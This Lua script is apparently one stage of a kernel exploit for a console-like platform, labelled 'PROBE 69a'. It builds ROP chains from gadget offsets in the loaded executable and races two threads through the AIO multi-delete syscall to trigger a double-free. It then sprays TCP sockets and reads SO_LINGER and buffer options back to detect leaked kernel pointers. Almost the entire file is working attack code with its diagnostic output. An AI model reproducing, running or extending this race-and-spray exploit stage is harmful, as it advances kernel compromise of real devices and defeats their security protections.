-- CRASH_CLASS: MODERATE
-- PROBE 69a: AIO double-free -> SO_LINGER socket spray readback
--
-- Context: 67i2 confirmed TOCTOU double-free in aio_multi_delete (662).
-- Two children call 662 concurrently on the same polled AIO ID array.
-- After confirmed double-free, spray 200 TCP sockets and set SO_LINGER
-- with sentinel values. Read back via getsockopt -- if the freed AIO
-- sub-object slot was reclaimed by a socket allocation, the overlap
-- may expose kernel pointers through SO_LINGER fields.
--
-- Strategy: freed slab slot is on free list twice. Socket allocation
-- may reclaim it, sharing kernel address with another object. Read
-- through socket interface to detect overlapping kernel data.

print("=== PROBE 69a: SO_LINGER SPRAY READBACK ===")
print("")

-- Standard helpers (ALWAYS include these)
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Additional helpers
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

-- Short aliases
local N = to_num
local mk = make_syscall

-- ============================================================
-- SETUP
-- ============================================================
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid_val
end

-- Eboot base via dynlib_get_info(593)
local ib = memory.alloc(0x200)
safe_wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = safe_rd(N(ib) + 0x108) or 0
local ehi = safe_rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore signals: SIGSEGV(11), SIGSYS(12), SIGPIPE(13)
local sa_buf = memory.alloc(0x20)
safe_wq(N(sa_buf), uint64(1))
safe_wd(N(sa_buf) + 8, 0)
safe_wq(uint64(N(sa_buf) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Open /dev/zero for AIO read target
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then
    print("FATAL: cannot open /dev/zero")
    print("=== 69a DONE ===")
    return
end

-- ============================================================
-- AIO HELPERS
-- ============================================================
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    safe_wq(N(reqs), uint64(0))
    safe_wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    safe_wd(N(reqs) + 0x10, bl)
    safe_wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    safe_wd(N(reqs) + 0x18, rl)
    safe_wd(N(reqs) + 0x1C, rh)
    safe_wd(N(reqs) + 0x20, fd_zero)
    safe_wd(N(reqs) + 0x24, 0)
    safe_wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return safe_rd(N(one_id)) or 0
end

local function poll_one(id)
    safe_wd(N(one_id), id)
    safe_wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- ============================================================
-- GATE SETUP (socketpair for child synchronization)
-- ============================================================
print("")
print("-- GATE SETUP --")
local sp_A = memory.alloc(16)
safe_wd(N(sp_A), 0xFFFFFFFF)
safe_wd(N(sp_A) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_A))) end)
local gra = safe_rd(N(sp_A)) or -1
local gwa = safe_rd(N(sp_A) + 4) or -1

local sp_B = memory.alloc(16)
safe_wd(N(sp_B), 0xFFFFFFFF)
safe_wd(N(sp_B) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_B))) end)
local grb = safe_rd(N(sp_B)) or -1
local gwb = safe_rd(N(sp_B) + 4) or -1
print(string.format("gateA: rd=%d wr=%d  gateB: rd=%d wr=%d", gra, gwa, grb, gwb))
if gra < 0 or gwa < 0 or grb < 0 or gwb < 0 then
    print("GATE FAIL")
    print("=== 69a DONE ===")
    return
end

-- Shared state buffers
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8)
local tmp_B = memory.alloc(8)
local wbyte = memory.alloc(8)
safe_wd(N(wbyte), 0x42)

-- Child stacks (allocated once, rewritten each iteration)
local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)

-- ============================================================
-- RACE LOOP: 662 double-free via gated thr_new children
-- ============================================================
local ITERS = 10
local total_doubles = 0

print("")
print("-- RACE: " .. ITERS .. " iters --")

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Submit BATCH AIO requests + poll each
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < BATCH then print("SHORT at iter " .. iter); break end

    -- Write IDs to shared buffer and init status arrays
    for i = 0, BATCH - 1 do
        safe_wd(N(del_ids) + i * 4, ids[i + 1])
        safe_wd(N(states_A) + i * 4, 0xAA)
        safe_wd(N(states_B) + i * 4, 0xBB)
    end
    safe_wq(N(marker_A), uint64(0))
    safe_wq(N(marker_B), uint64(0))

    -- Build child A ROP chain:
    --   write marker -> read gate (block) -> call 662 -> thr_exit
    local sb_A = N(stk_A)
    for i = 0, 0x1FFC, 4 do safe_wd(sb_A + i, 0) end
    local sp_a = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oa = 0
    local function wa(v) safe_wq(sp_a + oa, v); oa = oa + 8 end
    -- Write marker (child A is alive and waiting)
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    -- read(gate_rd_fd, tmp, 1) -- blocks until main fires gate
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gra))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    -- 662(del_ids, BATCH, states_A)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    -- thr_exit(0)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    -- Build child B ROP chain (same structure, different gate + states)
    local sb_B = N(stk_B)
    for i = 0, 0x1FFC, 4 do safe_wd(sb_B + i, 0) end
    local sp_b = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    local ob = 0
    local function wb(v) safe_wq(sp_b + ob, v); ob = ob + 8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(grb))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    -- thr_param for child A
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do safe_wd(N(pa) + i, 0) end
    safe_wq(N(pa), g_bare_ret)
    safe_wq(N(pa) + 0x10, uint64(sb_A))
    safe_wq(N(pa) + 0x18, uint64(0x2000))

    -- thr_param for child B
    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do safe_wd(N(pb) + i, 0) end
    safe_wq(N(pb), g_bare_ret)
    safe_wq(N(pb) + 0x10, uint64(sb_B))
    safe_wq(N(pb) + 0x18, uint64(0x2000))

    -- Spawn both children
    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    -- Wait for both markers (children alive and waiting at gate)
    local a_rdy, b_rdy = false, false
    for w = 1, 500000 do
        if not a_rdy and N(safe_rq(N(marker_A)) or uint64(0)) ~= 0 then a_rdy = true end
        if not b_rdy and N(safe_rq(N(marker_B)) or uint64(0)) ~= 0 then b_rdy = true end
        if a_rdy and b_rdy then break end
    end
    if not (a_rdy and b_rdy) then
        print(string.format("  iter %d: MARKER TIMEOUT a=%s b=%s", iter,
            tostring(a_rdy), tostring(b_rdy)))
        break
    end

    -- Brief delay then fire both gates simultaneously
    for d = 1, 500 do end
    pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte)), uint64(1)) end)

    -- Wait for children to complete
    for w = 1, 100000 do end

    -- Count doubles (both children successfully deleted same ID)
    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, BATCH - 1 do
        local sA = safe_rd(N(states_A) + i * 4) or 0xAA
        local sB = safe_rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLES *** A=%d B=%d", iter, doubles, a_ok, b_ok))
    else
        print(string.format("  iter %d: A=%d B=%d", iter, a_ok, b_ok))
    end
end

print("")
print("TOTAL_DOUBLES=" .. total_doubles)

if total_doubles == 0 then
    print("NO DOUBLES -- skipping spray")
    print("alive=" .. (alive() and "YES" or "NO"))
    print("=== 69a DONE ===")
    return
end

print("*** DOUBLE-FREE CONFIRMED -- proceeding to spray ***")

-- ============================================================
-- [SPRAY] Create 200 TCP sockets via socket(AF_INET=2, SOCK_STREAM=1, 0)
-- ============================================================
print("")
print("-- SPRAY: 200 TCP sockets --")

local SPRAY_COUNT = 200
local spray_fds = {}

for i = 1, SPRAY_COUNT do
    if not alive() then print("DEAD during spray at " .. i); break end
    local ok, rv = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(0))
    end)
    local fd = ok and sgn(rv) or -1
    if fd >= 0 then
        spray_fds[#spray_fds + 1] = fd
    end
end
print(string.format("  created: %d/%d sockets", #spray_fds, SPRAY_COUNT))

-- ============================================================
-- [SET] setsockopt SO_LINGER with sentinel values
-- setsockopt(fd, SOL_SOCKET=0xFFFF, SO_LINGER=0x0080, buf, 8)
-- ============================================================
print("")
print("-- SET SO_LINGER sentinels (l_onoff=0xDEAD, l_linger=0xBEEF) --")

local linger_set = memory.alloc(16)
local set_count = 0

for i = 1, #spray_fds do
    safe_wd(N(linger_set), 0xDEAD)      -- l_onoff sentinel
    safe_wd(N(linger_set) + 4, 0xBEEF)  -- l_linger sentinel
    local ok, rv = pcall(function()
        return mk(105)(uint64(spray_fds[i]),
            uint64(0xFFFF),              -- SOL_SOCKET
            uint64(0x0080),              -- SO_LINGER
            uint64(N(linger_set)),
            uint64(8))
    end)
    if ok and sgn(rv) == 0 then
        set_count = set_count + 1
    end
end
print(string.format("  setsockopt OK: %d/%d", set_count, #spray_fds))

-- ============================================================
-- [READBACK] getsockopt SO_LINGER -- scan for kernel pointers
-- getsockopt(fd, SOL_SOCKET=0xFFFF, SO_LINGER=0x0080, outbuf, &len)
--
-- Expected normal readback:
--   l_onoff = 0x0080 (SO_LINGER flag) or 0
--   l_linger = 0xBEEF (or 0xFFFFBEEF if sign-extended from short)
-- Anomaly: any value outside this pattern
-- Kernel pointer: hi dword >= 0xFFFF8000 and != 0xFFFFFFFF
-- ============================================================
print("")
print("-- READBACK SO_LINGER --")

local linger_get = memory.alloc(32)
local lenp = memory.alloc(8)
local kptrs = 0
local anomalies = 0
local first_normal = true

for i = 1, #spray_fds do
    -- Fill readback buffer with sentinels to detect overcopy
    for j = 0, 28, 4 do safe_wd(N(linger_get) + j, 0xCCCCCCCC) end
    safe_wd(N(lenp), 16)  -- request 16 bytes (linger struct is 8)

    local ok, rv = pcall(function()
        return mk(118)(uint64(spray_fds[i]),
            uint64(0xFFFF),              -- SOL_SOCKET
            uint64(0x0080),              -- SO_LINGER
            uint64(N(linger_get)),
            uint64(N(lenp)))
    end)
    local ret = ok and sgn(rv) or -999

    if ret == 0 then
        local d0 = safe_rd(N(linger_get)) or 0xCCCCCCCC       -- l_onoff
        local d1 = safe_rd(N(linger_get) + 4) or 0xCCCCCCCC   -- l_linger
        local d2 = safe_rd(N(linger_get) + 8) or 0xCCCCCCCC   -- past struct
        local d3 = safe_rd(N(linger_get) + 12) or 0xCCCCCCCC  -- past struct
        local rlen = safe_rd(N(lenp)) or 0

        -- Print first result for calibration
        if first_normal then
            print(string.format("  calibration: fd=%d l_onoff=0x%08X l_linger=0x%08X len=%d",
                spray_fds[i], d0, d1, rlen))
            first_normal = false
        end

        -- Check for anomalous l_onoff (expected: 0x0080 or 0)
        local onoff_ok = (d0 == 0x0080 or d0 == 0x80 or d0 == 0)
        -- Check for anomalous l_linger (expected: 0xBEEF or 0xFFFFBEEF sign-ext)
        local linger_ok = (d1 == 0xBEEF or d1 == 0xFFFFBEEF or d1 == 0)

        if not onoff_ok then
            anomalies = anomalies + 1
            if anomalies <= 20 then
                print(string.format("  [%d] fd=%d ANOMALY l_onoff=0x%08X l_linger=0x%08X",
                    i, spray_fds[i], d0, d1))
            end
            if d0 >= 0xFFFF8000 and d0 ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print(string.format("    *** KPTR in l_onoff: 0x%08X ***", d0))
            end
        end

        if not linger_ok and not (not onoff_ok) then
            anomalies = anomalies + 1
            if anomalies <= 20 then
                print(string.format("  [%d] fd=%d ANOMALY l_linger=0x%08X (expected 0xBEEF)",
                    i, spray_fds[i], d1))
            end
            if d1 >= 0xFFFF8000 and d1 ~= 0xFFFFFFFF and d1 ~= 0xFFFFBEEF then
                kptrs = kptrs + 1
                print(string.format("    *** KPTR in l_linger: 0x%08X ***", d1))
            end
        end

        -- Check full 8-byte qword for kernel pointer shape
        local q = safe_rq(N(linger_get))
        if q then
            local qh, ql = get_hi_lo(q)
            -- qh is l_linger (hi dword of LE qword), ql is l_onoff
            if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF and qh ~= 0xFFFFBEEF then
                kptrs = kptrs + 1
                print(string.format("  [%d] fd=%d *** KPTR qword: %s ***",
                    i, spray_fds[i], fmt(q)))
            end
        end

        -- Check for overcopy past 8-byte linger struct
        if d2 ~= 0xCCCCCCCC or d3 ~= 0xCCCCCCCC then
            anomalies = anomalies + 1
            if anomalies <= 20 then
                print(string.format("  [%d] fd=%d OVERCOPY +8=0x%08X +12=0x%08X",
                    i, spray_fds[i], d2, d3))
            end
            if d2 >= 0xFFFF8000 and d2 ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print("    *** KPTR IN OVERCOPY +8! ***")
            end
            if d3 >= 0xFFFF8000 and d3 ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print("    *** KPTR IN OVERCOPY +12! ***")
            end
        end
    end
end

-- ============================================================
-- [EXTRA] SO_SNDBUF + SO_RCVBUF anomaly scan on spray sockets
-- ============================================================
print("")
print("-- SO_SNDBUF/SO_RCVBUF scan (first 50) --")
local buf_anomalies = 0

for i = 1, math.min(#spray_fds, 50) do
    for _, opt in ipairs({0x1001, 0x1002}) do  -- SO_SNDBUF, SO_RCVBUF
        safe_wd(N(linger_get), 0xCCCCCCCC)
        safe_wd(N(linger_get) + 4, 0xCCCCCCCC)
        safe_wd(N(lenp), 8)
        local ok, rv = pcall(function()
            return mk(118)(uint64(spray_fds[i]),
                uint64(0xFFFF), uint64(opt),
                uint64(N(linger_get)), uint64(N(lenp)))
        end)
        if ok and sgn(rv) == 0 then
            local val = safe_rd(N(linger_get)) or 0
            local past = safe_rd(N(linger_get) + 4) or 0xCCCCCCCC
            if past ~= 0xCCCCCCCC then
                buf_anomalies = buf_anomalies + 1
                if buf_anomalies <= 5 then
                    print(string.format("  [%d] fd=%d opt=0x%X overcopy=0x%08X",
                        i, spray_fds[i], opt, past))
                end
            end
            if val > 0x1000000 then  -- unreasonable buffer size
                buf_anomalies = buf_anomalies + 1
                if buf_anomalies <= 5 then
                    print(string.format("  [%d] fd=%d opt=0x%X val=0x%08X ANOMALOUS",
                        i, spray_fds[i], opt, val))
                end
            end
        end
    end
end
if buf_anomalies == 0 then print("  (all normal)") end

-- ============================================================
-- [CLEANUP]
-- ============================================================
print("")
print("-- CLEANUP --")
for _, fd in ipairs(spray_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end
pcall(function() mk(6)(uint64(gra)) end)
pcall(function() mk(6)(uint64(gwa)) end)
pcall(function() mk(6)(uint64(grb)) end)
pcall(function() mk(6)(uint64(gwb)) end)
pcall(function() mk(6)(uint64(fd_zero)) end)

-- ============================================================
-- RESULTS
-- ============================================================
print("")
print(string.format("RESULTS: doubles=%d kptrs=%d anomalies=%d buf_anomalies=%d",
    total_doubles, kptrs, anomalies, buf_anomalies))
if kptrs > 0 then
    print("*** KERNEL POINTER DETECTED -- AIO slot reclaimed by socket! ***")
else
    print("No kernel pointers found in socket readback")
end
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 69a DONE ===")
